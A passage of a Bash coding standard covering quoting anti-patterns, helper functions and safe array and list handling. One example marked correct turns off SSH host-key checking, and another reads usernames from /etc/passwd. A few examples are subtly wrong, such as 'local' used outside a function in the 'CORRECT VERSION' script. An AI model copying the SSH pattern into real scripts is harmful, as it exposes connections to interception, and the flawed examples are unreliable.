| Static in conditionals | Single \`'...'\` or unquoted | \`[[ "$x" == 'value' ]]\` or \`[[ "$x" == value ]]\` |
| Array expansion | Double \`"${arr[@]}"\` | \`for i in "${arr[@]}"\` |
| Here doc (no expansion) | Single on delimiter | \`cat <<'EOF'\` |
| Here doc (with expansion) | No quotes on delimiter | \`cat <<EOF\` |


---


**Rule: BCS0411**

### Anti-Patterns (What NOT to Do)

**This section catalogues common quoting mistakes that lead to bugs, security vulnerabilities, and poor code quality. Each anti-pattern is shown with the incorrect form (✗) and the correct alternative (✓). Understanding these anti-patterns is critical for writing robust, maintainable Bash scripts.**

**Rationale for avoiding these anti-patterns:**

- **Security**: Improper quoting enables code injection and command injection attacks
- **Reliability**: Unquoted variables cause word splitting and glob expansion bugs
- **Consistency**: Mixed quoting styles make code harder to read and maintain
- **Performance**: Unnecessary quoting/bracing adds parsing overhead
- **Clarity**: Wrong quote choice obscures intent and confuses readers
- **Maintenance**: Anti-patterns make scripts fragile and error-prone

**Category 1: Double quotes for static strings**

This is the most common anti-pattern in Bash scripts.

```bash
# ✗ Wrong - double quotes for static strings (no variables)
info "Checking prerequisites..."
success "Operation completed"
error "File not found"
readonly ERROR_MSG="Invalid input"

# ✓ Correct - single quotes for static strings
info 'Checking prerequisites...'
success 'Operation completed'
error 'File not found'
readonly ERROR_MSG='Invalid input'

# ✗ Wrong - double quotes for multi-line static strings
cat <<EOF
{
  "name": "myapp",
  "version": "1.0.0"
}
EOF

# ✓ Correct - single quotes or literal here-doc
cat <<'EOF'
{
  "name": "myapp",
  "version": "1.0.0"
}
EOF

# ✗ Wrong - double quotes in case patterns
case "$action" in
  "start") start_service ;;
  "stop")  stop_service ;;
  "restart") restart_service ;;
esac

# ✓ Correct - unquoted one-word patterns
case "$action" in
  start) start_service ;;
  stop)  stop_service ;;
  restart) restart_service ;;
esac

# ✗ Wrong - double quotes for constant declarations
declare -- SCRIPT_NAME="myapp"
declare -- DEFAULT_CONFIG="/etc/myapp/config"

# ✓ Correct - single quotes for constants
declare -- SCRIPT_NAME='myapp'
declare -- DEFAULT_CONFIG='/etc/myapp/config'
```

**Category 2: Unquoted variables**

Unquoted variables are dangerous and unpredictable.

```bash
# ✗ Wrong - unquoted variable in conditional
[[ -f $file ]]
[[ -d $directory ]]
[[ -z $value ]]

# ✓ Correct - quoted variables
[[ -f "$file" ]]
[[ -d "$directory" ]]
[[ -z "$value" ]]

# ✗ Wrong - unquoted variable in assignment
target=$source
backup_file=$original_file

# ✓ Correct - quoted variable assignment (when source might have spaces)
target="$source"
backup_file="$original_file"

# ✗ Wrong - unquoted variable in echo
echo Processing $file...
echo Status: $status

# ✓ Correct - quoted variables
echo "Processing $file..."
echo "Status: $status"

# ✗ Wrong - unquoted variable in command
rm $temp_file
cp $source $destination

# ✓ Correct - quoted variables
rm "$temp_file"
cp "$source" "$destination"

# ✗ Wrong - unquoted array expansion
for item in ${items[@]}; do
  process $item
done

# ✓ Correct - quoted array expansion
for item in "${items[@]}"; do
  process "$item"
done
```

**Category 3: Unnecessary braces**

Braces should only be used when required.

```bash
# ✗ Wrong - braces not needed
echo "${HOME}/bin"
info "Installing to ${PREFIX}/share"
path="${CONFIG_DIR}/app.conf"

# ✓ Correct - no braces when not needed
echo "$HOME/bin"
info "Installing to $PREFIX/share"
path="$CONFIG_DIR/app.conf"

# ✗ Wrong - braces in simple assignments
name="${USER}"
dir="${PWD}"

# ✓ Correct - no braces needed
name="$USER"
dir="$PWD"

# ✗ Wrong - braces in conditionals (when not needed)
[[ -f "${file}" ]]
[[ "${count}" -eq 0 ]]

# ✓ Correct - no braces needed
[[ -f "$file" ]]
[[ "$count" -eq 0 ]]

# When braces ARE needed:
# ✓ Correct - braces required for parameter expansion
echo "${HOME:-/tmp}"        # Default value
echo "${file##*/}"          # Remove prefix
echo "${name/old/new}"      # Substitution
echo "${array[@]}"          # Array expansion
echo "${var1}${var2}"       # Adjacent variables
```

**Category 4: Unnecessary double quotes AND braces**

This combines two anti-patterns.

```bash
# ✗ Wrong - both unnecessary braces and wrong quotes
info "${PREFIX}/bin"              # Wrong: braces + part not variable
echo "Installing to ${PREFIX}"    # Wrong: braces not needed

# ✓ Correct - multiple valid forms
info "$PREFIX/bin"                # Best - no braces, literal unquoted
info "$PREFIX"/bin                # Also OK - explicit literal
echo "Installing to $PREFIX"      # Best - no braces

# ✗ Wrong - braces in static context
path="${HOME}/Documents"          # Braces not needed
file="${name}.txt"                # Braces not needed

# ✓ Correct - no braces
path="$HOME/Documents"
file="$name.txt"
```

**Category 5: Mixing quote styles inconsistently**

Inconsistent quoting confuses readers.

```bash
# ✗ Wrong - inconsistent quoting
info "Starting process..."
success 'Process complete'
warn "Warning: something happened"
error 'Error occurred'

# ✓ Correct - consistent quoting (all single quotes for static)
info 'Starting process...'
success 'Process complete'
warn 'Warning: something happened'
error 'Error occurred'

# ✗ Wrong - inconsistent variable quoting
[[ -f $file && -r "$file" ]]
path=$dir/$file
target="$destination"

# ✓ Correct - consistent variable quoting
[[ -f "$file" && -r "$file" ]]
path="$dir/$file"
target="$destination"
```

**Category 6: Quote escaping nightmares**

Avoid excessive escaping by using the right quote type.

```bash
# ✗ Wrong - escaping in double quotes
message="It's \"really\" important"
pattern="User: \"$USER\""

# ✓ Correct - use single quotes to avoid escaping
message='It'\''s "really" important'
# Or use $'...' for better readability
message=$'It\'s "really" important'

# ✗ Wrong - escaping backslashes
path="C:\\Users\\$USER\\Documents"

# ✓ Correct - single quotes for literal backslashes
path='C:\Users\Documents'
# Or when variable needed:
path="C:\\Users\\$USER\\Documents"  # If variable needed
```

**Category 7: Glob expansion dangers**

Unquoted variables can trigger unwanted glob expansion.

```bash
# ✗ Wrong - unquoted variable with glob characters
pattern='*.txt'
echo $pattern        # Expands to all .txt files!
[[ -f $pattern ]]    # Tests all .txt files!

# ✓ Correct - quoted to preserve literal
echo "$pattern"      # Outputs: *.txt
[[ -f "$pattern" ]]  # Tests for file named "*.txt"

# ✗ Wrong - unquoted in loop
files='*.sh'
for file in $files; do  # Glob expansion!
  echo "$file"
done

# ✓ Correct - quoted to prevent expansion
for file in "$files"; do  # Single iteration with literal
  echo "$file"  # Outputs: *.sh
done
```

**Category 8: Command substitution quoting**

Command substitution requires careful quoting.

```bash
# ✗ Wrong - unquoted command substitution
result=$(command)
echo $result         # Word splitting on result!

# ✓ Correct - quoted command substitution
result=$(command)
echo "$result"       # Preserves whitespace

# ✗ Wrong - double quotes for literal in substitution
version=$(cat "${VERSION_FILE}")

# ✓ Correct - only quote the variable
version=$(cat "$VERSION_FILE")

# ✗ Wrong - unquoted multi-line output
output=$(long_command)
echo $output         # Collapses to single line!

# ✓ Correct - quoted to preserve formatting
output=$(long_command)
echo "$output"       # Preserves all lines
```

**Category 9: Here-document quoting**

Here-docs have specific quoting rules.

```bash
# ✗ Wrong - quoted delimiter when variables needed
cat <<"EOF"
User: $USER          # Not expanded - stays as $USER
Home: $HOME          # Not expanded - stays as $HOME
EOF

# ✓ Correct - unquoted delimiter for variable expansion
cat <<EOF
User: $USER          # Expands to actual user
Home: $HOME          # Expands to actual home
EOF

# ✗ Wrong - unquoted delimiter for literal content
cat <<EOF
{
  "api_key": "$API_KEY"    # Expands variable (might not want this!)
}
EOF

# ✓ Correct - quoted delimiter for literal JSON
cat <<'EOF'
{
  "api_key": "$API_KEY"    # Literal - stays as $API_KEY
}
EOF
```

**Category 10: Special characters and escaping**

Special characters need proper handling.

```bash
# ✗ Wrong - unquoted special characters
email=user@domain.com         # @ has special meaning!
file=test(1).txt              # () are special!

# ✓ Correct - quoted for safety
email='user@domain.com'
file='test(1).txt'

# ✗ Wrong - escaping instead of quoting
message="It\'s a test"        # Unnecessary escape in double quotes
path="/usr/local/bin/\$cmd"   # Escaping $

# ✓ Correct - use appropriate quote type
message="It's a test"         # Single quote doesn't need escape in double quotes
message='It'\''s a test'      # Or use single quotes with escaped quote
path='/usr/local/bin/$cmd'    # Single quotes - $ is literal
```

**Complete anti-pattern example (full of mistakes):**

```bash
#!/bin/bash
set -euo pipefail

# ✗ WRONG VERSION - Full of anti-patterns

VERSION="1.0.0"                              # ✗ Double quotes for static
SCRIPT_PATH=${0}                             # ✗ Unquoted expansion
SCRIPT_DIR=${SCRIPT_PATH%/*}                 # ✗ Unquoted
SCRIPT_NAME=${SCRIPT_PATH##*/}               # ✗ Unquoted

# ✗ Double quotes everywhere
readonly PREFIX="${PREFIX:-/usr/local}"      # ✗ Braces + double quotes
BIN_DIR="${PREFIX}/bin"                      # ✗ Braces not needed

# ✗ Unquoted variables
info "Starting ${SCRIPT_NAME}..."            # ✗ Double quotes for static, braces

check_file() {
  local file=$1                              # ✗ Unquoted assignment

  # ✗ Unquoted variable in conditional
  if [[ -f $file ]]; then
    info "Processing ${file}..."             # ✗ Double quotes, braces
    return 0
  else
    error "File not found: ${file}"          # ✗ Double quotes, braces
    return 1
  fi
}

# ✗ Unquoted array expansion
files=(file1.txt "file 2.txt" file3.txt)
for file in ${files[@]}; do                  # ✗ Unquoted - breaks on spaces!
  check_file $file                           # ✗ Unquoted argument
done

info "Done processing files"                 # ✗ Double quotes for static
```

**Corrected version:**

```bash
#!/bin/bash
set -euo pipefail

# ✓ CORRECT VERSION

VERSION='1.0.0'                              # ✓ Single quotes for static
SCRIPT_PATH=$(realpath -- "$0")          # ✓ Quoted variable
SCRIPT_DIR=${SCRIPT_PATH%/*}                 # ✓ Braces needed for expansion
SCRIPT_NAME=${SCRIPT_PATH##*/}               # ✓ Braces needed for expansion
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# ✓ Minimal quoting
readonly PREFIX="${PREFIX:-/usr/local}"      # ✓ Braces needed for default
BIN_DIR="$PREFIX/bin"                        # ✓ No braces, quotes for safety

# ✓ Single quotes for static
info 'Starting script...'

check_file() {
  local -- file="$1"                         # ✓ Quoted assignment

  # ✓ Quoted variable in conditional
  if [[ -f "$file" ]]; then
    info "Processing $file..."               # ✓ Double quotes (has variable), no braces
    return 0
  else
    error "File not found: $file"            # ✓ Double quotes (has variable), no braces
    return 1
  fi
}

# ✓ Quoted array expansion
declare -a files=('file1.txt' 'file 2.txt' 'file3.txt')
local -- file
for file in "${files[@]}"; do                # ✓ Quoted array expansion
  check_file "$file"                         # ✓ Quoted argument
done

info 'Done processing files'                 # ✓ Single quotes for static
```

**Quick reference checklist:**

```bash
# Static strings → Single quotes
'literal text'                ✓
"literal text"                ✗

# Variables in strings → Double quotes, no braces
"text with $var"              ✓
"text with ${var}"            ✗
'text with $var'              ✗ (doesn't expand)

# Variables in commands → Quoted
echo "$var"                   ✓
echo $var                     ✗

# Variables in conditionals → Quoted
[[ -f "$file" ]]              ✓
[[ -f $file ]]                ✗

# Array expansion → Quoted
"${array[@]}"                 ✓
${array[@]}                   ✗

# Braces → Only when needed
"${var##*/}"                  ✓ (parameter expansion)
"${array[@]}"                 ✓ (array expansion)
"${var1}${var2}"              ✓ (adjacent variables)
"${var:-default}"             ✓ (default value)
"${HOME}"                     ✗ (not needed)

# One-word literals → Unquoted or single quotes
[[ "$var" == value ]]         ✓
[[ "$var" == 'value' ]]       ✓
[[ "$var" == "value" ]]       ✗

# Command substitution → Quote the variable, not the path
result=$(cat "$file")         ✓
result=$(cat "${file}")       ✗
result=$(cat $file)           ✗

# Here-docs → Quote delimiter for literal
cat <<'EOF'                   ✓ (literal content)
cat <<"EOF"                   ✓ (same as above)
cat <<EOF                     ✓ (expand variables)
```

**Summary:**

- **Never use double quotes for static strings** - use single quotes or unquoted one-word literals
- **Always quote variables** - in conditionals, assignments, commands, and expansions
- **Don't use braces unless required** - parameter expansion, arrays, or adjacent variables only
- **Never combine unnecessary braces with static text** - use `"$VAR/path"` not `"${VAR}/path"`
- **Quote array expansions consistently** - `"${array[@]}"` is mandatory
- **Be consistent** - don't mix quote styles for similar contexts
- **Use the right quote type** - single for literal, double for variables, none for one-word literals
- **Avoid escaping nightmares** - choose quote type to minimize escaping

**Key principle:** Quoting anti-patterns make code fragile, insecure, and hard to maintain. Following proper quoting rules eliminates entire classes of bugs. When in doubt: quote variables, use single quotes for static text, and avoid unnecessary braces. The extra keystrokes for proper quoting prevent hours of debugging mysterious failures.


---


**Rule: BCS0412**

### String Trimming
\`\`\`bash
trim() {
  local v="$*"
  v="${v#"${v%%[![:blank:]]*}"}"
  echo -n "${v%"${v##*[![:blank:]]}"}"
}
\`\`\`


---


**Rule: BCS0413**

### Display Declared Variables
\`\`\`bash
decp() { declare -p "$@" | sed 's/^declare -[a-zA-Z-]* //'; }
\`\`\`


---


**Rule: BCS0414**

### Pluralisation Helper
\`\`\`bash
s() { (( ${1:-1} == 1 )) || echo -n 's'; }
\`\`\`


---


**Rule: BCS0501**

### Array Declaration and Usage

**Declaring arrays:**

\`\`\`bash
# Indexed arrays (explicitly declared)
declare -a DELETE_FILES=('*~' '~*' '.~*')
declare -a paths=()  # Empty array

# Local arrays in functions
local -a Paths=()
local -a found_files

# Initialize with elements
declare -a colors=('red' 'green' 'blue')
declare -a numbers=(1 2 3 4 5)
\`\`\`

**Rationale for explicit array declaration:**
- **Clarity**: Signals to readers that variable is an array
- **Type safety**: Prevents accidental scalar assignment
- **Scope control**: Use `local -a` in functions to prevent global pollution
- **Consistency**: Makes arrays visually distinct from scalar variables

**Adding elements to arrays:**

\`\`\`bash
# Append single element
Paths+=("$1")
files+=("$filename")

# Append multiple elements
args+=("$arg1" "$arg2" "$arg3")

# Append another array
all_files+=("${config_files[@]}" "${log_files[@]}")
\`\`\`

**Array iteration (always use `"${array[@]}"`)**

\`\`\`bash
# ✓ Correct - quoted expansion, handles spaces safely
for path in "${Paths[@]}"; do
  process "$path"
done

# ✗ Wrong - unquoted, breaks with spaces
for path in ${Paths[@]}; do  # ✗ Dangerous!
  process "$path"
done

# ✗ Wrong - without [@], only processes first element
for path in "$Paths"; do  # ✗ Only iterates once
  process "$path"
done
\`\`\`

**Array length:**

\`\`\`bash
# Get number of elements
file_count=${#files[@]}
((${#Paths[@]} > 0)) && process_paths

# Check if array is empty
if ((${#array[@]} == 0)); then
  echo 'Array is empty'
fi

# Set default if empty
((${#Paths[@]})) || Paths=('.')  # If empty, set to current dir
\`\`\`

**Reading into arrays:**

\`\`\`bash
# Split string by delimiter into array
IFS=',' read -ra fields <<< "$csv_line"
IFS=':' read -ra path_components <<< "$PATH"

# Read command output into array (preferred method)
readarray -t lines < <(grep pattern file)
readarray -t files < <(find . -name "*.txt")

# Alternative: mapfile (same as readarray)
mapfile -t users < <(cut -d: -f1 /etc/passwd)

# Read file into array (one line per element)
readarray -t config_lines < config.txt
\`\`\`

**Rationale for `readarray -t`:**
- **`-t`**: Removes trailing newlines from each element
- **`< <()`**: Process substitution avoids subshell (variables persist)
- **Safety**: Handles filenames with spaces, newlines correctly
- **Clarity**: Purpose is immediately clear

**Accessing array elements:**

\`\`\`bash
# Access single element (0-indexed)
first=${array[0]}
second=${array[1]}
last=${array[-1]}  # Last element (bash 4.3+)

# All elements (for iteration or passing)
"${array[@]}"  # Each element as separate word
"${array[*]}"  # All elements as single word (rarely needed)

# Slice (subset of array)
"${array[@]:2}"     # Elements from index 2 onwards
"${array[@]:1:3}"   # 3 elements starting from index 1
\`\`\`

**Modifying arrays:**

\`\`\`bash
# Unset (delete) an element
unset 'array[3]'  # Remove element at index 3

# Unset last element
unset 'array[${#array[@]}-1]'

# Replace element
array[2]='new value'

# Clear entire array
array=()
unset array  # Also works, but () is clearer
\`\`\`

**Array patterns in practice:**

\`\`\`bash
# Collect arguments during parsing
declare -a input_files=()
while (($#)); do case $1 in
  -*)   handle_option "$1" ;;
  *)    input_files+=("$1") ;;
esac; shift; done

# Process collected files
for file in "${input_files[@]}"; do
  [[ -f "$file" ]] || die 2 "File not found: $file"
  process_file "$file"
done

# Build command arguments dynamically
declare -a find_args=()
find_args+=('-type' 'f')
((max_depth > 0)) && find_args+=('-maxdepth' "$max_depth")
[[ -n "$name_pattern" ]] && find_args+=('-name' "$name_pattern")

find "${search_dir:-.}" "${find_args[@]}"
\`\`\`

**Checking array membership:**

\`\`\`bash
# Check if value exists in array
has_element() {
  local search=$1
  shift
  local element
  for element; do
    [[ "$element" == "$search" ]] && return 0
  done
  return 1
}

# Usage
declare -a valid_options=('start' 'stop' 'restart')
has_element "$action" "${valid_options[@]}" || die 22 "Invalid action: $action"
\`\`\`

**Anti-patterns to avoid:**

\`\`\`bash
# ✗ Wrong - unquoted array expansion
files=(*.txt)
rm ${files[@]}  # Breaks with filenames containing spaces

# ✓ Correct - quoted expansion
files=(*.txt)
rm "${files[@]}"

# ✗ Wrong - iterating with indices (unnecessary complexity)
for i in "${!array[@]}"; do
  echo "${array[$i]}"
done

# ✓ Correct - iterate over values directly
for value in "${array[@]}"; do
  echo "$value"
done

# ✗ Wrong - word splitting to create array
array=($string)  # Dangerous! Splits on whitespace, expands globs

# ✓ Correct - explicit array assignment or readarray
readarray -t array <<< "$string"

# ✗ Wrong - using array[*] in iteration
for item in "${array[*]}"; do  # ✗ Iterates once with all items as one string
  echo "$item"
done

# ✓ Correct - use array[@]
for item in "${array[@]}"; do
  echo "$item"
done
\`\`\`

**Summary of array operators:**

| Operation | Syntax | Description |
|-----------|--------|-------------|
| Declare | `declare -a arr=()` | Create empty array |
| Append | `arr+=("value")` | Add element to end |
| Length | `${#arr[@]}` | Number of elements |
| All elements | `"${arr[@]}"` | Each element as separate word |
| Single element | `"${arr[i]}"` | Element at index i |
| Last element | `"${arr[-1]}"` | Last element (bash 4.3+) |
| Slice | `"${arr[@]:2:3}"` | 3 elements from index 2 |
| Unset element | `unset 'arr[i]'` | Remove element at index i |
| Indices | `"${!arr[@]}"` | All array indices |

**Key principle:** Always quote array expansions: `"${array[@]}"` to preserve spacing and prevent word splitting.


---


**Rule: BCS0502**

### Arrays for Safe List Handling

**Use arrays to store lists of elements safely, especially for command arguments, file lists, and any collection where elements may contain spaces, special characters, or wildcards. Arrays provide proper element boundaries and eliminate word splitting and glob expansion issues that plague string-based lists.**

**Rationale:**

- **Element Preservation**: Arrays maintain element boundaries regardless of content (spaces, newlines, special chars)
- **No Word Splitting**: Array elements don't undergo word splitting when expanded with `"${array[@]}"`
- **Glob Safety**: Array elements containing wildcards are preserved literally
- **Safe Command Construction**: Arrays enable building commands with arbitrary arguments safely
- **Iteration Safety**: Array iteration processes each element exactly once, preserving all content
- **Dynamic Lists**: Arrays can grow, shrink, and be modified without quoting complications

**Why arrays are safer than strings:**

**Problem with string lists:**

```bash
# ✗ DANGEROUS - String-based list
files_str="file1.txt file with spaces.txt file3.txt"

# Word splitting breaks this!
for file in $files_str; do
  echo "$file"
done
# Output:
# file1.txt
# file
# with
# spaces.txt
# file3.txt
# (5 iterations instead of 3!)

# Command arguments break too
cmd $files_str  # Passes 5 arguments instead of 3!
```

**Solution with arrays:**

```bash
# ✓ SAFE - Array-based list
declare -a files=(
  'file1.txt'
  'file with spaces.txt'
  'file3.txt'
)

# Proper iteration
for file in "${files[@]}"; do
  echo "$file"
done
# Output:
# file1.txt
# file with spaces.txt
# file3.txt
# (3 iterations - correct!)

# Safe command arguments
cmd "${files[@]}"  # Passes exactly 3 arguments
```

**Safe command argument construction:**

**1. Building commands with variable arguments:**

```bash
# ✓ Correct - array for command arguments
build_command() {
  local -- output_file="$1"
  local -i verbose="$2"

  # Build command in array
  local -a cmd=(
    'myapp'
    '--config' '/etc/myapp/config.conf'
    '--output' "$output_file"
  )

  # Add conditional arguments
  if ((verbose)); then
    cmd+=('--verbose')
  fi

  # Execute safely
  "${cmd[@]}"
}

build_command 'output file.txt' 1
# Executes: myapp --config /etc/myapp/config.conf --output 'output file.txt' --verbose
```

**2. Complex command with many options:**

```bash
# ✓ Correct - build find command safely
search_files() {
  local -- search_dir="$1"
  local -- pattern="$2"

  local -a find_args=(
    "$search_dir"
    '-type' 'f'
  )

  # Add name pattern if provided
  if [[ -n "$pattern" ]]; then
    find_args+=('-name' "$pattern")
  fi

  # Add time constraints
  find_args+=(
    '-mtime' '-7'
    '-size' '+1M'
  )

  # Execute
  find "${find_args[@]}"
}

search_files '/home/user' '*.log'
```

**3. SSH/rsync with dynamic arguments:**

```bash
# ✓ Correct - SSH command with conditional arguments
ssh_connect() {
  local -- host="$1"
  local -i use_key="$2"
  local -- key_file="$3"

  local -a ssh_args=(
    '-o' 'StrictHostKeyChecking=no'
    '-o' 'UserKnownHostsFile=/dev/null'
  )

  if ((use_key)) && [[ -f "$key_file" ]]; then
    ssh_args+=('-i' "$key_file")
  fi

  ssh_args+=("$host")

  ssh "${ssh_args[@]}"
}

ssh_connect 'user@example.com' 1 "$HOME/.ssh/id_rsa"
```

**Safe file list handling:**

**1. Processing multiple files:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# Process list of files safely
process_files() {
  # Collect files into array
  local -a files=(
    "$SCRIPT_DIR/data/file 1.txt"
    "$SCRIPT_DIR/data/report (final).pdf"
    "$SCRIPT_DIR/data/config.conf"
  )

  local -- file
  local -i processed=0

  # Safe iteration
  for file in "${files[@]}"; do
    if [[ -f "$file" ]]; then
      info "Processing: $file"
      # Process file
      ((processed+=1))
    else
      warn "File not found: $file"
    fi
  done

  info "Processed $processed files"
}

# Gather files with globbing into array
gather_files() {
  local -- pattern="$1"

  # Use array to collect glob results
  local -a matching_files=("$SCRIPT_DIR"/$pattern)

  # Check if glob matched anything
  if [[ ${#matching_files[@]} -eq 0 ]]; then
    error "No files matching: $pattern"
    return 1
  fi

  info "Found ${#matching_files[@]} files"

  # Process array
  local -- file
  for file in "${matching_files[@]}"; do
    info "File: $file"
  done
}

main() {
  process_files
  gather_files '*.txt'
}

main "$@"

#fin
```

**2. Building lists dynamically:**

```bash
# Build file list based on criteria
collect_log_files() {
  local -- log_dir="$1"
  local -i max_age="$2"

  local -a log_files=()
  local -- file

  # Collect matching files into array
  while IFS= read -r -d '' file; do
    log_files+=("$file")
  done < <(find "$log_dir" -name '*.log' -mtime "-$max_age" -print0)

  info "Collected ${#log_files[@]} log files"

  # Process array
  for file in "${log_files[@]}"; do
    process_log "$file"
  done
}
```

**Safe argument passing to functions:**

```bash
# ✓ Correct - pass array to function
process_items() {
  # Capture all arguments as array
  local -a items=("$@")
  local -- item

  info "Processing ${#items[@]} items"

  for item in "${items[@]}"; do
    info "Item: $item"
  done
}

# Build array and pass
declare -a my_items=(
  'item one'
  'item with "quotes"'
  'item with $special chars'
)

# Safe expansion
process_items "${my_items[@]}"
```

**Conditional array building:**

```bash
# Build array based on conditions
build_compiler_flags() {
  local -i debug="$1"
  local -i optimize="$2"

  local -a flags=('-Wall' '-Werror')

  if ((debug)); then
    flags+=('-g' '-DDEBUG')
  fi

  if ((optimize)); then
    flags+=('-O2' '-DNDEBUG')
  else
    flags+=('-O0')
  fi

  # Return array by echoing elements
  printf '%s\n' "${flags[@]}"
}

# Capture into array
declare -a compiler_flags
readarray -t compiler_flags < <(build_compiler_flags 1 0)

# Use array
gcc "${compiler_flags[@]}" -o myapp myapp.c
```

**Complete example with safe list handling:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

declare -i VERBOSE=0
declare -i DRY_RUN=0

# Build backup command with safe argument handling
create_backup() {
  local -- source_dir="$1"
  local -- backup_dir="$2"

  # Build tar command in array
  local -a tar_args=(
    '-czf'
    "$backup_dir/backup-$(date +%Y%m%d).tar.gz"
    '-C' "${source_dir%/*}"
    "${source_dir##*/}"
  )

  # Add verbose flag if requested
  ((VERBOSE)) && tar_args+=('-v')

  # Build exclude patterns
  local -a exclude_patterns=(
    '*.tmp'
    '*.log'
    '.git'
  )

  # Add excludes to tar command
  local -- pattern
  for pattern in "${exclude_patterns[@]}"; do
    tar_args+=('--exclude' "$pattern")
  done

  # Execute or show command
  if ((DRY_RUN)); then
    info '[DRY-RUN] Would execute:'
    printf '  %s\n' "${tar_args[@]}"
  else
    info 'Creating backup...'
    tar "${tar_args[@]}"
  fi
}

# Process multiple directories
process_directories() {
  # Collect directories to process
  local -a directories=(
    "$HOME/Documents"
    "$HOME/Projects/my project"
    "$HOME/.config"
  )

  local -- dir
  local -i count=0

  for dir in "${directories[@]}"; do
    if [[ -d "$dir" ]]; then
      create_backup "$dir" '/backup'
      ((count+=1))
    else
      warn "Directory not found: $dir"
    fi
  done

  success "Backed up $count directories"
}

# Build rsync command with array
sync_files() {
  local -- source="$1"
  local -- destination="$2"

  # Build rsync command
  local -a rsync_args=(
    '-av'
    '--progress'
    '--exclude' '.git/'
    '--exclude' '*.tmp'
  )

  ((DRY_RUN)) && rsync_args+=('--dry-run')

  rsync_args+=(
    "$source"
    "$destination"
  )

  info 'Syncing files...'
  rsync "${rsync_args[@]}"
}

main() {
  # Parse arguments
  while (($#)); do case $1 in
    -v|--verbose) VERBOSE=1 ;;
    -n|--dry-run) DRY_RUN=1 ;;
    *) die 22 "Invalid option: $1" ;;
  esac; shift; done

  readonly -- VERBOSE DRY_RUN

  process_directories
  sync_files "$HOME/data" '/backup/data'
}

main "$@"

#fin
```

**Anti-patterns to avoid:**

```bash
# ✗ Wrong - string-based list
files_str="file1.txt file2.txt file with spaces.txt"
for file in $files_str; do  # Word splitting!
  process "$file"
done

# ✓ Correct - array-based list
declare -a files=('file1.txt' 'file2.txt' 'file with spaces.txt')
for file in "${files[@]}"; do
  process "$file"
done

# ✗ Wrong - concatenating strings for commands
cmd_args="-o output.txt --verbose"
mycmd $cmd_args  # Word splitting issues

# ✓ Correct - array for command arguments
declare -a cmd_args=('-o' 'output.txt' '--verbose')
mycmd "${cmd_args[@]}"

# ✗ Wrong - building command with string concatenation
cmd="find $dir -name $pattern"
eval "$cmd"  # Dangerous - eval with user input!

# ✓ Correct - array-based command construction
declare -a find_args=("$dir" '-name' "$pattern")
find "${find_args[@]}"

# ✗ Wrong - IFS manipulation for iteration
IFS=','
for item in $csv_string; do  # Fragile, modifies IFS
  echo "$item"
done
IFS=' '

# ✓ Correct - array from IFS split (if really needed)
IFS=',' read -ra items <<< "$csv_string"
for item in "${items[@]}"; do
  echo "$item"
done

# ✗ Wrong - collecting glob results in string
files=$(ls *.txt)  # Parses ls output - very wrong!
for file in $files; do
  process "$file"
done

# ✓ Correct - glob directly into array
declare -a files=(*.txt)
for file in "${files[@]}"; do
  process "$file"
done

# ✗ Wrong - passing list as single string
files="file1 file2 file3"
process_files "$files"  # Receives as single argument

# ✓ Correct - passing array elements
declare -a files=('file1' 'file2' 'file3')
process_files "${files[@]}"  # Each file as separate argument

# ✗ Wrong - unquoted array variable
declare -a items=('a' 'b' 'c')
cmd ${items[@]}  # Word splitting on each element!

# ✓ Correct - quoted array expansion
cmd "${items[@]}"
```

**Edge cases and advanced patterns:**

**1. Empty arrays:**

```bash
# Empty array is safe to iterate
declare -a empty=()

# Zero iterations - no errors
for item in "${empty[@]}"; do
  echo "$item"  # Never executes
done

# Safe to pass to functions
process_items "${empty[@]}"  # Function receives zero arguments
```

**2. Arrays with special characters:**

```bash
# Array with various special characters
declare -a special=(
  'file with spaces.txt'
  'file"with"quotes.txt'
  'file$with$dollars.txt'
  'file*with*wildcards.txt'
  $'file\nwith\nnewlines.txt'
)

# All elements preserved safely
for file in "${special[@]}"; do
  echo "File: $file"
done
```

**3. Merging arrays:**

```bash
# Combine multiple arrays
declare -a arr1=('a' 'b')
declare -a arr2=('c' 'd')
declare -a arr3=('e' 'f')

declare -a combined=(
  "${arr1[@]}"
  "${arr2[@]}"
  "${arr3[@]}"
)

echo "Combined: ${#combined[@]} elements"  # 6 elements
```

**4. Array slicing:**

```bash
# Extract subset of array
declare -a numbers=(0 1 2 3 4 5 6 7 8 9)

# Elements 2-5 (4 elements starting at index 2)
declare -a subset=("${numbers[@]:2:4}")
echo "${subset[@]}"  # Output: 2 3 4 5
```

**5. Removing duplicates:**

```bash
# Remove duplicates from array (preserves order)
remove_duplicates() {
  local -a input=("$@")
  local -a output=()
  local -A seen=()
  local -- item

  for item in "${input[@]}"; do
    if [[ ! -v seen[$item] ]]; then
      output+=("$item")
      seen[$item]=1
    fi
  done

  printf '%s\n' "${output[@]}"
}

declare -a with_dupes=('a' 'b' 'a' 'c' 'b' 'd')
declare -a unique
readarray -t unique < <(remove_duplicates "${with_dupes[@]}")
echo "${unique[@]}"  # Output: a b c d
```

**Summary:**

- **Use arrays for all lists** - files, arguments, options, any collection
- **Arrays preserve element boundaries** - no word splitting or glob expansion
- **Safe command construction** - build commands in arrays, expand with `"${array[@]}"`
- **Safe iteration** - `for item in "${array[@]}"` processes each element exactly once
- **Dynamic building** - arrays can be built conditionally and modified safely
- **Function arguments** - pass arrays with `"${array[@]}"`, receive with `local -a arr=("$@")`
- **Never use string lists** - they break with spaces, quotes, or special characters
- **Avoid IFS manipulation** - use arrays instead
- **Quote array expansion** - always use `"${array[@]}"` not `${array[@]}`

**Key principle:** Arrays are the safe, correct way to handle lists in Bash. String-based lists inevitably fail with edge cases (spaces, wildcards, special chars). Every list, whether of files, arguments, or values, should be stored in an array and expanded with `"${array[@]}"`. This eliminates entire categories of bugs and makes scripts robust against unexpected input.


---


**Rule: BCS0601**

### Function Definition Pattern
